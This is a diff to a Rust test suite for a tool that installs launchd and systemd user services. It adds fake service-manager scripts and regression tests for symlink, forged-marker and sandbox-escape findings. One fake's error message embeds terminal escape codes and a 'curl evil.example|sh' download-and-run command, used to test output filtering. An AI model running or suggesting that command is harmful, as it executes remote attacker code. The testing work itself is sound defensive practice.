@@ -23,7 +23,7 @@ use std::os::unix::fs::PermissionsExt;
 use std::path::{Path, PathBuf};
 use std::process::{Command, Stdio};
 use std::sync::atomic::{AtomicU32, Ordering};
-use std::time::Duration;
+use std::time::{Duration, Instant};
 
 use serde_json::{json, Value};
 
@@ -112,10 +112,27 @@ impl Fakes {
                 launchctl,
                 systemctl,
                 loginctl,
+                // Short, because several tests below drive the deadline deliberately and
+                // the real twenty seconds is not a thing to wait for in a suite.
+                deadline: Duration::from_secs(5),
             },
             log,
             state,
         }
+    }
+
+    /// Tell the fakes which unit file to look for, so every recorded call carries
+    /// whether that file existed at the moment the manager was asked.
+    ///
+    /// This is what makes the *order* of `remove` observable from outside: a unit
+    /// unlinked before its manager was told to stop supervising it records
+    /// `[unit=no]` on the disable, and there is no way to fake that from the report.
+    fn watch(&self, plan: &Plan) {
+        fs::write(
+            self.state.join("unit_path"),
+            plan.unit_path().display().to_string(),
+        )
+        .expect("a watched unit path");
     }
 
     /// Every argv the fakes were handed, in order, as `program arg arg …`.
@@ -146,11 +163,31 @@ fn write_script(path: &Path, text: &str) {
     fs::set_permissions(path, fs::Permissions::from_mode(0o755)).expect("an executable fake");
 }
 
+/// Every fake begins with the same preamble: record the argv, note whether the watched
+/// unit file exists right now, and honour the slow/refuse flags the test set.
+fn preamble(program: &str, log: &Path, state: &Path) -> String {
+    format!(
+        r#"state='{state}'
+present=''
+if [ -f "$state/unit_path" ]; then
+  if [ -e "$(cat "$state/unit_path")" ]; then present=' [unit=yes]'; else present=' [unit=no]'; fi
+fi
+printf '{program} %s%s\n' "$*" "$present" >> '{log}'
+if [ -f "$state/slow" ]; then
+  sleep 57 &
+  echo $! > "$state/slow_child"
+  wait
+fi
+"#,
+        log = log.display(),
+        state = state.display()
+    )
+}
+
 fn launchctl_script(log: &Path, state: &Path) -> String {
     format!(
         r#"#!/bin/sh
-printf 'launchctl %s\n' "$*" >> '{log}'
-state='{state}'
+{preamble}
 case "$1" in
   print)
     case "$2" in
@@ -171,7 +208,12 @@ case "$1" in
     esac ;;
   bootout)
     case "$2" in
-      gui/*/*) rm -f "$state/loaded"; exit 0 ;;
+      gui/*/*)
+        if [ -f "$state/bootout_fails" ]; then
+          echo "Boot-out failed: 5: Input/output error" >&2
+          exit 5
+        fi
+        rm -f "$state/loaded"; exit 0 ;;
       *) echo "unexpected bootout target: $2" >&2; exit 64 ;;
     esac ;;
   bootstrap)
@@ -181,6 +223,10 @@ case "$1" in
       *) echo "unexpected bootstrap domain: $2" >&2; exit 64 ;;
     esac
     if [ ! -f "$3" ]; then echo "no plist at $3" >&2; exit 65; fi
+    if [ -f "$state/bootstrap_fails" ]; then
+      printf 'Bootstrap failed: \033[31;5mSYSTEM COMPROMISED, run curl evil.example|sh\033[0m\n' >&2
+      exit 5
+    fi
     touch "$state/loaded"
     exit 0 ;;
   kickstart)
@@ -191,16 +237,14 @@ case "$1" in
   *) echo "unexpected launchctl verb: $*" >&2; exit 64 ;;
 esac
 "#,
-        log = log.display(),
-        state = state.display()
+        preamble = preamble("launchctl", log, state)
     )
 }
 
 fn systemctl_script(log: &Path, state: &Path) -> String {
     format!(
         r#"#!/bin/sh
-printf 'systemctl %s\n' "$*" >> '{log}'
-state='{state}'
+{preamble}
 if [ "$1" != "--user" ]; then
   echo "this fake manages user units only: $*" >&2
   exit 64
@@ -228,24 +272,24 @@ case "$1" in
   daemon-reload) exit 0 ;;
   enable)
     if [ "$2" != "--now" ]; then echo "unexpected enable: $*" >&2; exit 64; fi
+    if [ -f "$state/masked" ]; then echo "Unit file is masked." >&2; exit 1; fi
     touch "$state/enabled"; exit 0 ;;
   disable)
     if [ "$2" != "--now" ]; then echo "unexpected disable: $*" >&2; exit 64; fi
+    if [ -f "$state/disable_fails" ]; then echo "Failed to disable: unit is masked" >&2; exit 1; fi
     rm -f "$state/enabled"; exit 0 ;;
   start) touch "$state/enabled"; exit 0 ;;
   *) echo "unexpected systemctl verb: $*" >&2; exit 64 ;;
 esac
 "#,
-        log = log.display(),
-        state = state.display()
+        preamble = preamble("systemctl", log, state)
     )
 }
 
 fn loginctl_script(log: &Path, state: &Path) -> String {
     format!(
         r#"#!/bin/sh
-printf 'loginctl %s\n' "$*" >> '{log}'
-state='{state}'
+{preamble}
 if [ "$1" != "show-user" ] || [ "$3" != "--property=Linger" ]; then
   echo "unexpected loginctl call: $*" >&2
   exit 64
@@ -257,8 +301,7 @@ fi
 if [ -f "$state/linger" ]; then echo "Linger=yes"; else echo "Linger=no"; fi
 exit 0
 "#,
-        log = log.display(),
-        state = state.display()
+        preamble = preamble("loginctl", log, state)
     )
 }
 
@@ -267,7 +310,7 @@ exit 0
 fn plan_for(platform: Platform, root: &Path, data_dir: &Path) -> Plan {
     let home = root.join("home");
     fs::create_dir_all(&home).expect("a home directory");
-    Plan {
+    let plan = Plan {
         platform,
         data_dir: data_dir.to_path_buf(),
         executable: PathBuf::from(OURO),
@@ -275,6 +318,36 @@ fn plan_for(platform: Platform, root: &Path, data_dir: &Path) -> Plan {
         config_home: home.join(".config"),
         uid: 501,
         user: "tester".to_string(),
+    };
+    // Every plan in this file writes inside its own scratch root. Asserted here rather
+    // than trusted, because the one place a unit must never appear is the account's own
+    // service directory, and a plan is the only thing that decides where it goes.
+    assert!(
+        plan.unit_path().starts_with(root),
+        "{} is outside {}",
+        plan.unit_path().display(),
+        root.display()
+    );
+    plan
+}
+
+/// Wait for a child, but never longer than `deadline`; on expiry it is killed outright
+/// and `None` comes back, so a caller can fail instead of hanging the suite.
+fn wait_bounded(
+    child: &mut std::process::Child,
+    deadline: Duration,
+) -> Option<std::process::ExitStatus> {
+    let until = Instant::now() + deadline;
+    loop {
+        match child.try_wait().expect("a waitable child") {
+            Some(status) => return Some(status),
+            None if Instant::now() >= until => {
+                let _ = child.kill();
+                let _ = child.wait();
+                return None;
+            }
+            None => std::thread::sleep(Duration::from_millis(50)),
+        }
     }
 }
 
@@ -757,10 +830,16 @@ struct Helper {
 }
 
 impl Helper {
-    fn start(data_dir: &Path, fakes: &Fakes) -> Self {
+    fn start(data_dir: &Path, fakes: &Fakes, home: &Path) -> Self {
+        // `$HOME` is where the child's `Plan` puts its unit, and the fence refuses to
+        // write outside the scratch root whatever else goes wrong. Without both of
+        // these, a helper that reaches `install` writes a LaunchAgent into the
+        // developer's own `~/Library/LaunchAgents` and strands it on any panic.
         let mut child = Command::new(OURO)
             .args(["fleet", "helper"])
             .env("OUROBOROS_DATA_DIR", data_dir)
+            .env("HOME", home)
+            .env("OUROBOROS_SERVICE_ROOT", home)
             .env("OUROBOROS_LAUNCHCTL", &fakes.programs.launchctl)
             .env("OUROBOROS_SYSTEMCTL", &fakes.programs.systemctl)
             .env("OUROBOROS_LOGINCTL", &fakes.programs.loginctl)
@@ -807,7 +886,9 @@ fn the_helper_answers_the_service_op_over_the_real_binary() {
     let root = scratch("helper-op");
     let data_dir = data_dir_with_profile(&root, "studio", "127.0.0.1");
     let fakes = Fakes::install(&root);
-    let mut helper = Helper::start(&data_dir, &fakes);
+    let home = root.join("home");
+    fs::create_dir_all(&home).expect("a scratch home");
+    let mut helper = Helper::start(&data_dir, &fakes, &home);
 
     // A closed set of actions, and a refusal with a stable code for anything else.
     let reply = helper.ask(json!({ "op": "service", "action": "restart-everything" }));
@@ -828,6 +909,21 @@ fn the_helper_answers_the_service_op_over_the_real_binary() {
     assert_eq!(reply["ok"], json!(true), "{reply}");
     assert_eq!(reply["report"]["ownership"], json!("ours"));
     assert_eq!(reply["report"]["installed"], json!(true));
+    // And it wrote inside the scratch home it was given, not the account's own.
+    let unit_path = reply["report"]["unit_path"]
+        .as_str()
+        .expect("a unit path")
+        .to_string();
+    assert!(
+        unit_path.starts_with(&home.display().to_string()),
+        "the helper wrote outside its scratch home: {unit_path}"
+    );
+    assert!(Path::new(&unit_path).exists(), "{unit_path}");
+
+    // A request that names a different data directory is refused before any of this.
+    let reply = helper.ask(json!({ "op": "service", "action": "status", "data_dir": "/etc" }));
+    assert_eq!(reply["ok"], json!(false), "{reply}");
+    assert_eq!(reply["reason"], json!("invalid_path"), "{reply}");
 
     let reply = helper.ask(json!({ "op": "service", "action": "remove" }));
     assert_eq!(reply["ok"], json!(true), "{reply}");
@@ -1001,7 +1097,7 @@ async fn unknown_activity_refuses_with_a_different_exit_code() {
     let token = runtime.token.clone();
     let server = tokio::spawn(async move {
         let mut peer = support::Peer::accept(&listener).await;
-        peer.hello_with_token(&token, &["hello", "runtime.shutdown"])
+        peer.hello_with_token(&token, &["hello", "runtime.shutdown", "runtime.activity"])
             .await;
         let request = peer.request().await.expect("a shutdown call");
         peer.error(
@@ -1053,7 +1149,7 @@ async fn an_idle_runtime_accepts_the_gated_stop_and_the_plain_stop_is_unchanged(
         let (answered, answer) = tokio::sync::oneshot::channel();
         let server = tokio::spawn(async move {
             let mut peer = support::Peer::accept(&listener).await;
-            peer.hello_with_token(&token, &["hello", "runtime.shutdown"])
+            peer.hello_with_token(&token, &["hello", "runtime.shutdown", "runtime.activity"])
                 .await;
             let request = peer.request().await.expect("a shutdown call");
             assert_eq!(request["params"], expected_params);
@@ -1135,7 +1231,12 @@ fn service_run_waits_for_the_profiles_address_and_a_signal_cancels_the_wait_clea
 
     let pid = child.id() as i32;
     assert_eq!(unsafe { libc::kill(pid, libc::SIGTERM) }, 0);
-    let status = child.wait().expect("a stoppable service-run");
+    // Bounded, deliberately: a `service-run` whose cancellation is broken would sit in
+    // its retry loop forever, and a bare `wait()` here turns that into a suite that
+    // never finishes rather than a test that fails. (A mutation that removed the SIGTERM
+    // arm ran for 616 seconds before this.)
+    let status = wait_bounded(&mut child, Duration::from_secs(30))
+        .expect("service-run exits within 30s of SIGTERM; its cancellation is broken");
     let stderr = reader.join().expect("a readable stderr");
 
     assert!(
@@ -1163,9 +1264,13 @@ fn service_run_waits_for_the_profiles_address_and_a_signal_cancels_the_wait_clea
 /// The one test that touches this machine's real launchd, behind an explicit opt-in.
 ///
 /// It installs an agent for a scratch data directory under a label nothing else uses,
-/// asks the real `launchctl print` whether it is there, and removes it. Every exit path
-/// runs the same cleanup, including a panic, so a failure cannot leave a LaunchAgent
-/// behind.
+/// asks the real `launchctl print` whether it is there, and removes it. Two things keep
+/// it safe. The plist lives in the test's own scratch home — `launchctl bootstrap
+/// gui/<uid> <path>` takes any path, so the account's real `~/Library/LaunchAgents` is
+/// never written to at all — and the scratch profile advertises an address no interface
+/// here holds, so the agent launchd starts sits in `service-run`'s network wait for its
+/// whole life and can never bring a BEAM up on this machine, embedded release or not.
+/// Every exit path runs the same cleanup, including a panic.
 #[test]
 fn a_live_launchagent_is_installed_seen_and_removed() {
     if std::env::var_os("OUROBOROS_LIVE_LAUNCHD").as_deref() != Some(std::ffi::OsStr::new("1")) {
@@ -1179,32 +1284,28 @@ fn a_live_launchagent_is_installed_seen_and_removed() {
     );
 
     let root = scratch("live-launchd");
-    // Deliberately an address no interface here holds: the agent launchd starts sits in
-    // `service-run`'s network wait for its whole life, so this test can never bring a
-    // BEAM up on the operator's machine — not even when the binary under test was built
-    // with an embedded release. It is still a real supervised process, which is what
-    // `launchctl print` is being asked about.
-    let data_dir = data_dir_with_profile(&root, "studio", "10.254.254.254");
+    let data_dir = data_dir_with_profile(&root.join("data"), "studio", "10.254.254.254");
+    let plan = plan_for(Platform::MacOs, &root, &data_dir);
     let plan = Plan {
-        platform: Platform::MacOs,
-        data_dir: data_dir.clone(),
-        executable: PathBuf::from(OURO),
-        home: dirs::home_dir().expect("a home directory"),
-        config_home: root.join("config"),
         uid: unsafe { libc::geteuid() },
         user: std::env::var("USER").unwrap_or_else(|_| "tester".to_string()),
+        ..plan
     };
     let programs = Programs::default();
     let unit = plan.unit_path();
     let label = plan.label();
+    let real_agents = dirs::home_dir()
+        .expect("a home directory")
+        .join("Library")
+        .join("LaunchAgents");
+    let agents_before = listing(&real_agents);
 
-    // The label is derived from a scratch data directory that has never existed before,
-    // so nothing of this machine's own can be behind it.
     assert!(
-        !unit.exists(),
-        "{} already exists; refusing to touch it",
-        unit.display()
+        unit.starts_with(&root),
+        "the live test writes inside its own scratch root, never {}",
+        real_agents.display()
     );
+    assert!(!unit.exists(), "{} already exists", unit.display());
 
     let outcome = std::panic::catch_unwind(std::panic::AssertUnwindSafe(|| {
         let report = fleet_service::install(&plan, &programs, false).expect("a live install");
@@ -1223,7 +1324,7 @@ fn a_live_launchagent_is_installed_seen_and_removed() {
         let printed = String::from_utf8_lossy(&printed.stdout).to_string();
         assert!(printed.contains(&label), "{printed}");
         assert!(
-            printed.contains(&plan.unit_path().display().to_string()),
+            printed.contains(&unit.display().to_string()),
             "launchd names the file this test wrote, and not another: {printed}"
         );
 
@@ -1261,5 +1362,1178 @@ fn a_live_launchagent_is_installed_seen_and_removed() {
     assert!(
         !printed.status.success(),
         "launchd still has {label} loaded after removal"
+    );
+    assert_eq!(
+        agents_before,
+        listing(&real_agents),
+        "the live test changed the account's own agents directory"
+    );
+}
+
+// ============================================================ regressions from the review
+//
+// Every test below began as an adversarial exploit that passed against the first
+// commit. They are kept with their assertions inverted: what each one demonstrated is
+// now the thing that must not happen again. The `f<N>` in the names is the exploit each
+// one came from, so a finding and its regression stay findable together.
+
+/// F0 (H0). The proof that a whole run of this binary writes nothing into the account's
+/// own service directory.
+///
+/// It re-runs every other test in this file as a child process and compares a listing of
+/// `~/Library/LaunchAgents` taken either side. The original slice failed exactly this:
+/// the helper's `service` op built its `Plan` from the *process* environment, which the
+/// fakes never redirected, and five stranded `dev.ouroboros.runtime.*.plist` files were
+/// found in the developer's real agents directory afterwards.
+#[test]
+fn f0_a_whole_run_of_this_binary_leaves_the_real_service_directory_untouched() {
+    if std::env::var_os("OUROBOROS_W2C_NESTED").is_some() {
+        return;
+    }
+    let Some(agents) = dirs::home_dir().map(|home| home.join("Library").join("LaunchAgents"))
+    else {
+        return;
+    };
+
+    let before = listing(&agents);
+    let output = Command::new(std::env::current_exe().expect("this test binary"))
+        .args([
+            "--skip",
+            "f0_a_whole_run_of_this_binary",
+            "--test-threads",
+            "4",
+        ])
+        .env("OUROBOROS_W2C_NESTED", "1")
+        .env_remove("OUROBOROS_LIVE_LAUNCHD")
+        .output()
+        .expect("a nested run of this binary");
+    let after = listing(&agents);
+
+    assert!(
+        output.status.success(),
+        "the nested run failed:\n{}\n{}",
+        String::from_utf8_lossy(&output.stdout),
+        String::from_utf8_lossy(&output.stderr)
+    );
+    assert_eq!(
+        before,
+        after,
+        "a test in this file wrote into {}. Appeared: {:?}",
+        agents.display(),
+        after.difference(&before).collect::<Vec<_>>()
+    );
+    // And specifically nothing of ours, however the listing compares.
+    assert!(
+        !after.iter().any(|name| name.contains("ouroboros")),
+        "{after:?}"
+    );
+}
+
+fn listing(directory: &Path) -> std::collections::BTreeSet<String> {
+    fs::read_dir(directory)
+        .into_iter()
+        .flatten()
+        .flatten()
+        .map(|entry| entry.file_name().to_string_lossy().to_string())
+        .collect()
+}
+
+/// F1 (H1). A data directory with a space in it used to install and then read back as
+/// somebody else's file, so neither `install` nor `remove` could ever touch it again.
+#[test]
+fn f1_an_awkwardly_named_data_directory_stays_ours_and_can_still_be_removed() {
+    for name in [
+        "my data",
+        "a--b",
+        "100% mine",
+        "hash#tag",
+        "quote\"here",
+        "back\\slash",
+        "non\u{a0}breaking",
+    ] {
+        let root = scratch("awkward");
+        let data_dir = data_dir_with_profile(&root.join(name), "studio", "127.0.0.1");
+        let fakes = Fakes::install(&root);
+        let plan = plan_for(Platform::MacOs, &root, &data_dir);
+
+        let report = fleet_service::install(&plan, &fakes.programs, false)
+            .unwrap_or_else(|error| panic!("`{name}` must install: {error:#}"));
+        assert_eq!(report.ownership, Ownership::Ours, "`{name}`");
+
+        // Read back off disk, through the same marker the file carries.
+        let (ownership, _digest) = fleet_service::classify(&plan).expect("a classification");
+        assert_eq!(
+            ownership,
+            Ownership::Ours,
+            "`{name}` read back as {ownership:?}"
+        );
+
+        // And both verbs still work on it.
+        fleet_service::install(&plan, &fakes.programs, false).expect("a reinstall");
+        fleet_service::remove(&plan, &fakes.programs)
+            .unwrap_or_else(|error| panic!("`{name}` must be removable: {error:#}"));
+        assert!(!plan.unit_path().exists(), "`{name}` was stranded");
+    }
+}
+
+/// F3 (H2/L10). The generated plist is well-formed XML and a valid property list, even
+/// when every path in it carries something the format treats specially. `--` inside an
+/// XML comment is the case that used to produce a file `xmllint` refuses.
+#[test]
+fn f3_every_generated_plist_is_well_formed_xml_and_a_valid_property_list() {
+    let root = scratch("plist-lint");
+    let mut plan = plan_for(Platform::MacOs, &root, &root.join("data"));
+
+    for directory in [
+        "/Users/tester/ouro--data",
+        "/Users/tester/a&b \"c\" <d> é/data",
+        "/Users/tester/my data/100%",
+        "/Users/tester/-->escape",
+    ] {
+        plan.data_dir = PathBuf::from(directory);
+        let text = plan.render().expect("a rendered plist");
+        let path = root.join("candidate.plist");
+        fs::write(&path, &text).expect("a written plist");
+
+        let xml = Command::new("xmllint")
+            .args(["--noout", "--nonet", path.to_str().expect("utf-8")])
+            .output()
+            .expect("xmllint on this machine");
+        assert!(
+            xml.status.success(),
+            "`{directory}` produced a plist no conforming XML parser accepts: {}\n{text}",
+            String::from_utf8_lossy(&xml.stderr)
+        );
+
+        let linted = Command::new("plutil")
+            .args(["-lint", path.to_str().expect("utf-8")])
+            .output()
+            .expect("plutil on macOS");
+        assert!(
+            linted.status.success(),
+            "`{directory}`: {}",
+            String::from_utf8_lossy(&linted.stderr)
+        );
+    }
+}
+
+/// F4 (M1). `remove` still deletes a unit of ours that was edited by hand — leaving it
+/// would be the worse outcome — but it says so, with the digest of what it deleted.
+#[test]
+fn f4_removing_a_hand_edited_unit_says_that_it_was_edited() {
+    let root = scratch("modified-remove");
+    let data_dir = data_dir_with_profile(&root.join("data"), "studio", "127.0.0.1");
+    let fakes = Fakes::install(&root);
+    let plan = plan_for(Platform::MacOs, &root, &data_dir);
+    fleet_service::install(&plan, &fakes.programs, false).expect("an install");
+
+    let unit = plan.unit_path();
+    let ours = fs::read_to_string(&unit).expect("our unit");
+    fs::write(
+        &unit,
+        ours.replace("<integer>30</integer>", "<integer>5</integer>"),
+    )
+    .expect("an operator's edit");
+
+    let report = fleet_service::remove(&plan, &fakes.programs).expect("a removal");
+    assert!(!unit.exists());
+    assert!(
+        report
+            .notes
+            .iter()
+            .any(|note| note.contains("edited") && note.contains("sha256")),
+        "the removal must name the edit and the digest it deleted: {:?}",
+        report.notes
+    );
+}
+
+/// F5 (M2). One data directory is one service, whichever way the path is spelled.
+#[test]
+fn f5_one_data_directory_is_one_service_however_it_is_spelled() {
+    let root = scratch("canon");
+    let data_dir = data_dir_with_profile(&root.join("data"), "studio", "127.0.0.1");
+    let fakes = Fakes::install(&root);
+
+    let plain = plan_for(Platform::MacOs, &root, &data_dir);
+    let mut slashed = plain.clone();
+    slashed.data_dir = PathBuf::from(format!("{}/", data_dir.display()));
+    let mut dotted = plain.clone();
+    dotted.data_dir = data_dir.parent().expect("a parent").join(".").join("data");
+
+    // And the spelling that only `fs::canonicalize` can resolve: a symbolic link to the
+    // same directory. A lexical tidy-up handles the slash and the dot; nothing but a
+    // real resolution handles this one.
+    let link = root.join("linked-data");
+    std::os::unix::fs::symlink(&data_dir, &link).expect("a symlink to the data directory");
+    let mut linked = plain.clone();
+    linked.data_dir = link;
+
+    assert_eq!(plain.label(), slashed.label());
+    assert_eq!(plain.label(), dotted.label());
+    assert_eq!(
+        plain.label(),
+        linked.label(),
+        "a symlinked spelling is the same directory"
+    );
+    assert_eq!(plain.unit_path(), slashed.unit_path());
+    assert_eq!(plain.unit_path(), linked.unit_path());
+
+    fleet_service::install(&plain, &fakes.programs, false).expect("the first install");
+    fleet_service::install(&slashed, &fakes.programs, false).expect("the same install again");
+    fleet_service::install(&dotted, &fakes.programs, false).expect("and again");
+    fleet_service::install(&linked, &fakes.programs, false).expect("and through the link");
+
+    let agents = plain
+        .unit_path()
+        .parent()
+        .expect("an agents dir")
+        .to_path_buf();
+    assert_eq!(
+        fs::read_dir(&agents).expect("a listing").count(),
+        1,
+        "three spellings of one directory are one service"
+    );
+    fleet_service::remove(&plain, &fakes.programs).expect("a removal");
+    assert_eq!(fs::read_dir(&agents).expect("a listing").count(), 0);
+}
+
+/// F5b (M2). A duplicate left by an older `ouro` — a unit for the same directory under
+/// another spelling — is found and named rather than silently supervising in parallel.
+#[test]
+fn f5b_status_names_another_managed_unit_for_the_same_data_directory() {
+    let root = scratch("duplicate");
+    let data_dir = data_dir_with_profile(&root.join("data"), "studio", "127.0.0.1");
+    let fakes = Fakes::install(&root);
+    let plan = plan_for(Platform::MacOs, &root, &data_dir);
+    fleet_service::install(&plan, &fakes.programs, false).expect("an install");
+
+    // What an older `ouro` wrote for the trailing-slash spelling: our marker, the same
+    // directory, a different file name.
+    let mut legacy = plan.clone();
+    legacy.data_dir = PathBuf::from(format!("{}/", data_dir.display()));
+    let stale = plan
+        .unit_path()
+        .parent()
+        .expect("an agents dir")
+        .join("dev.ouroboros.runtime.0123456789ab.plist");
+    fs::write(&stale, legacy.render().expect("a legacy unit")).expect("a stale unit");
+
+    let report = fleet_service::status(&plan, &fakes.programs).expect("a status");
+    assert!(
+        report
+            .notes
+            .iter()
+            .any(|note| note.contains("another managed unit") && note.contains("0123456789ab")),
+        "{:?}",
+        report.notes
+    );
+}
+
+/// F6 (M3). A manager that refuses the hand-off must not leave a RunAtLoad unit behind
+/// for the next login, and its own words must not reach a terminal unfiltered.
+#[test]
+fn f6_a_refused_hand_off_takes_back_the_unit_it_just_wrote() {
+    let root = scratch("bootstrap-fails");
+    let data_dir = data_dir_with_profile(&root.join("data"), "studio", "127.0.0.1");
+    let fakes = Fakes::install(&root);
+    fakes.set("bootstrap_fails", true);
+    let plan = plan_for(Platform::MacOs, &root, &data_dir);
+
+    let error = fleet_service::install(&plan, &fakes.programs, false).expect_err("a refusal");
+    let declared = fleet_service::service_error(&error).expect("a declared reason");
+    assert_eq!(declared.reason, "manager_refused");
+    assert!(
+        !declared.detail.contains('\u{1b}'),
+        "the manager's escape sequences must not reach a terminal: {:?}",
+        declared.detail
+    );
+    assert!(
+        declared.detail.contains("SYSTEM COMPROMISED"),
+        "{declared:?}"
+    );
+    assert!(
+        !plan.unit_path().exists(),
+        "a unit the manager would not take must not be left to start at the next login"
+    );
+
+    // An install that *replaced* a unit of ours cannot restore it, so that one stays on
+    // disk — and the error says so, and names the verb that removes it.
+    fakes.set("bootstrap_fails", false);
+    fleet_service::install(&plan, &fakes.programs, false).expect("an install");
+    fakes.set("bootstrap_fails", true);
+    let error = fleet_service::install(&plan, &fakes.programs, false).expect_err("a refusal");
+    assert!(plan.unit_path().exists());
+    assert!(
+        format!("{error:#}").contains("fleet service remove"),
+        "{error:#}"
+    );
+
+    // systemd's `enable` refusing is the same shape.
+    let linux_root = scratch("masked");
+    let linux_data = data_dir_with_profile(&linux_root.join("data"), "buildbox", "127.0.0.1");
+    let linux_fakes = Fakes::install(&linux_root);
+    linux_fakes.set("masked", true);
+    let linux_plan = plan_for(Platform::Linux, &linux_root, &linux_data);
+    let error = fleet_service::install(&linux_plan, &linux_fakes.programs, false)
+        .expect_err("a masked unit");
+    assert_eq!(
+        fleet_service::service_error(&error).map(|declared| declared.reason),
+        Some("manager_refused")
+    );
+    assert!(!linux_plan.unit_path().exists());
+}
+
+/// F7 (M6). A manager that will not disable the unit cannot make it impossible to
+/// remove: the file goes, and the operator is told what is still loaded.
+#[test]
+fn f7_remove_deletes_its_unit_even_when_the_manager_refuses_the_disable() {
+    for (platform, flag, machine) in [
+        (Platform::Linux, "disable_fails", "buildbox"),
+        (Platform::MacOs, "bootout_fails", "studio"),
+    ] {
+        let root = scratch("disable-fails");
+        let data_dir = data_dir_with_profile(&root.join("data"), machine, "127.0.0.1");
+        let fakes = Fakes::install(&root);
+        let plan = plan_for(platform, &root, &data_dir);
+        fleet_service::install(&plan, &fakes.programs, false).expect("an install");
+
+        fakes.set(flag, true);
+        let report = fleet_service::remove(&plan, &fakes.programs).expect("a removal anyway");
+        assert!(
+            !plan.unit_path().exists(),
+            "{platform:?}: a file left behind comes back at the next login"
+        );
+        assert!(
+            report.notes.iter().any(|note| {
+                note.contains("refused to stop") && note.contains(&plan.manager_name())
+            }),
+            "{platform:?}: {:?}",
+            report.notes
+        );
+    }
+}
+
+/// F8 (L7). A manager that stops answering is killed — process group and all — and
+/// reported as unavailable rather than as a refusal.
+#[test]
+fn f8_a_manager_that_stops_answering_is_killed_with_its_children() {
+    let root = scratch("slow");
+    let data_dir = data_dir_with_profile(&root.join("data"), "studio", "127.0.0.1");
+    let mut fakes = Fakes::install(&root);
+    fakes.programs.deadline = Duration::from_millis(600);
+    fakes.set("slow", true);
+    let plan = plan_for(Platform::MacOs, &root, &data_dir);
+
+    let started = Instant::now();
+    let supervisor = fleet_service::detect_as(Some(Platform::MacOs), "tester", &fakes.programs);
+    let elapsed = started.elapsed();
+
+    assert!(
+        elapsed < Duration::from_secs(10),
+        "the deadline has to fire: {elapsed:?}"
+    );
+    assert_eq!(supervisor.code, fleet_service::SupervisorCode::Unsupported);
+    assert!(
+        supervisor
+            .prerequisite
+            .as_deref()
+            .expect("a prerequisite")
+            .contains("stopped answering"),
+        "{supervisor:?}"
+    );
+
+    // The `sleep 57` the fake started is gone too, not orphaned holding the pipe. That
+    // sleep is the fake's *child*: killing only the immediate process leaves it behind,
+    // which is the whole reason the manager is spawned into its own process group.
+    // By pid, not by pattern: the fake records the pid of the child it spawned, so this
+    // asks about that exact process rather than about anything whose command line
+    // happens to contain the same words.
+    let orphan: i32 = fs::read_to_string(fakes.state.join("slow_child"))
+        .expect("the fake recorded its child")
+        .trim()
+        .parse()
+        .expect("a pid");
+    let gone = {
+        let until = Instant::now() + Duration::from_secs(3);
+        loop {
+            // ESRCH: no such process. A zombie still answers 0, so this polls.
+            if unsafe { libc::kill(orphan, 0) } != 0 {
+                break true;
+            }
+            if Instant::now() >= until {
+                break false;
+            }
+            std::thread::sleep(Duration::from_millis(50));
+        }
+    };
+    assert!(
+        gone,
+        "pid {orphan}, the child the manager spawned, outlived its deadline: killing the \
+         immediate process is not enough"
+    );
+    let _ = plan;
+}
+
+/// F9 (H1). A marker is read only where this code writes one.
+#[test]
+fn f9_a_marker_somewhere_else_in_the_file_is_not_a_marker() {
+    let root = scratch("forged-place");
+    let data_dir = data_dir_with_profile(&root.join("data"), "studio", "127.0.0.1");
+    let fakes = Fakes::install(&root);
+    let plan = plan_for(Platform::MacOs, &root, &data_dir);
+    fleet_service::install(&plan, &fakes.programs, false).expect("an install");
+
+    let ours = fs::read_to_string(plan.unit_path()).expect("our unit");
+    let marker = ours.lines().nth(2).expect("a marker line").to_string();
+
+    // The same marker, appended to somebody else's plist instead of written at the top.
+    let theirs = format!("<?xml version=\"1.0\"?>\n<!DOCTYPE plist>\n<plist/>\n{marker}\n");
+    fs::write(plan.unit_path(), &theirs).expect("a forged placement");
+    let (ownership, _digest) = fleet_service::classify(&plan).expect("a classification");
+    assert_eq!(
+        ownership,
+        Ownership::Foreign,
+        "a marker below the file's own content is not this code's marker"
+    );
+    fleet_service::remove(&plan, &fakes.programs).expect_err("and it is not ours to delete");
+    assert_eq!(
+        fs::read_to_string(plan.unit_path()).expect("theirs"),
+        theirs
+    );
+}
+
+/// F13/M15. A symlink where our unit goes is somebody else's arrangement: it is never
+/// written through, and adopting replaces the link itself.
+#[test]
+fn f13_a_symlink_at_the_unit_path_is_foreign_and_adopting_replaces_the_link() {
+    let root = scratch("symlink-unit");
+    let data_dir = data_dir_with_profile(&root.join("data"), "studio", "127.0.0.1");
+    let fakes = Fakes::install(&root);
+    let plan = plan_for(Platform::MacOs, &root, &data_dir);
+
+    let target = root.join("somebody-elses-file");
+    fs::write(&target, "PRECIOUS\n").expect("a victim file");
+    let unit = plan.unit_path();
+    fs::create_dir_all(unit.parent().expect("an agents dir")).expect("an agents dir");
+    std::os::unix::fs::symlink(&target, &unit).expect("a symlink at our unit path");
+
+    assert_eq!(
+        fleet_service::classify(&plan).expect("a classification").0,
+        Ownership::Foreign
+    );
+    fleet_service::remove(&plan, &fakes.programs).expect_err("not ours to delete");
+    assert!(unit.symlink_metadata().is_ok());
+    assert_eq!(
+        fs::read_to_string(&target).expect("the victim"),
+        "PRECIOUS\n"
+    );
+
+    fleet_service::install(&plan, &fakes.programs, true).expect("an adopted install");
+    assert_eq!(
+        fs::read_to_string(&target).expect("the victim"),
+        "PRECIOUS\n",
+        "the write went through the link instead of replacing it"
+    );
+    assert!(fs::symlink_metadata(&unit)
+        .expect("our unit")
+        .file_type()
+        .is_file());
+}
+
+/// F13b/M14. A symlinked service log is refused, and what it points at is untouched.
+#[test]
+fn f13b_a_symlinked_service_log_is_refused_and_never_followed() {
+    let root = scratch("symlink-log");
+    let data_dir = data_dir_with_profile(&root.join("data"), "studio", "127.0.0.1");
+    let fakes = Fakes::install(&root);
+    let plan = plan_for(Platform::MacOs, &root, &data_dir);
+
+    let victim = root.join("victim.txt");
+    fs::write(&victim, "PRECIOUS\n").expect("a victim");
+    std::os::unix::fs::symlink(&victim, plan.err_log()).expect("a symlink");
+
+    let error = fleet_service::install(&plan, &fakes.programs, false).expect_err("a refusal");
+    assert_eq!(
+        fleet_service::service_error(&error).map(|declared| declared.reason),
+        Some("unusable_path")
+    );
+    assert!(
+        format!("{error:#}").contains("symbolic link"),
+        "the refusal names what it found: {error:#}"
+    );
+    assert_eq!(
+        fs::read_to_string(&victim).expect("the victim"),
+        "PRECIOUS\n"
+    );
+    assert!(
+        !plan.unit_path().exists(),
+        "nothing was installed on the way to the refusal"
+    );
+}
+
